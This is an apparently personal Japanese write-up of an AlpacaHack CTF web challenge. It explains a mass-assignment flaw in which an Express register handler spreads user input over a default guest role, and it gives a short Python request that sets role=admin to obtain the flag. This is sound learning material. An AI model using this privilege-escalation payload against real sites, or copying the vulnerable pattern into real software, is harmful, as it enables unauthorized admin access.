# [Web] I wanna be the Admin
## 問題の概要
- **Difficulty:** Easy
- **Released:** Jan 13, 2026
- **Solved:** 2026-05-28
- **URL:** https://alpacahack.com/daily/challenges/i-wanna-be-the-admin

### 問題文
> でもguestから始めよう!

## 方針
指定された URL に飛ぶと、
- Login画面：username, password
- Register画面：username, password, nickname

を入力できる画面が表示される。
しかし、その画面からユーザー登録しても role として登録されるのは guest になってしまう。
何とかして role に admin を登録したい！

## 解法
ダウンロードできるフォルダの中でも、`index.js`を確認する。

▼ role が admin なら FLAG が表示される部分
```js
app.get("/", auth, (req, res) => {
  const { username, role, nickname } = req.user;

  res.send(`
    <h1>Hello ${username} (${nickname ?? "no nickname"})</h1>
    <p>role: ${role}</p>
    ${role === "admin" ? `<p><b>${FLAG}</b></p>` : ""}
    <a href="/logout">Logout</a>
  `);
});
```
▼ 登録の部分
```js
app.post("/register", (req, res) => {
  const user_data = req.body;
  if (
    !user_data ||
    !user_data.username ||
    !user_data.password ||
    !/^[a-z0-9]+$/.test(user_data.username) ||
    (user_data.nickname && !/^[a-z0-9]+$/.test(user_data.nickname))
  )
    return res.send("invalid input");

  if (users.has(user_data.username)) {
    return res.send("user already exists");
  }

  users.set(user_data.username, {
    role: "guest",
    ...user_data,
  });

  res.cookie("username", user_data.username);
  res.redirect("/");
});
```
登録の部分でも特に注目すべき個所が、
```js
  users.set(user_data.username, {
    role: "guest",
    ...user_data,
  });
```
である。
- `role: "guest"`：ユーザにデフォルトで `guest` 権限を与える。
- `...user_data`：スプレッド構文。 `user_data` の中に入っているプロパティを展開して、新しいオブジェクトの中にまとめてコピーする。

つまり、最初に `user` に `guest` 権限を与えたところで、 `user_data` に `role: "admin"` が入っていたら、最終的には `admin` 権限に変更されてしまうということだと考えた。

## 結果
Python で以下のプログラムを組んだ。

▼Pythonプログラム
```Python
import requests

# URLを伏字（******）に変更しています。
res = requests.post("http://******/register", 
    data={"username": "test", "password": "test", "role": "admin"})

print(res.text)
```
▼実行結果（FLAGは伏字（***）に変更しています。）
```
    <h1>Hello test (no nickname)</h1>
    <p>role: admin</p>
    <p><b>Alpaca{***}</b></p>
    <a href="/logout">Logout</a>
```
これにより、 `role: "admin"` を達成でき、FLAG を手に入れた。

## 感想
プログラムを構成しようと思うまで時間がかかってしまったが、roleにadminを入れたい！と思うまではできるようになったので成長を感じました。

## 今回初めて知ったこと
Python で `requests` モジュールを用いてサーバーにHTTPリクエストを送り、その結果を確認する方法。

- Python の `requests.post()` を使えば、Web サーバーへのデータ送信が数行のコードで実現できる。
- 辞書型データを `data` 引数に渡す「フォーム送信」と、`json` 引数に渡す「 JSON 送信」の2つの方法が主流。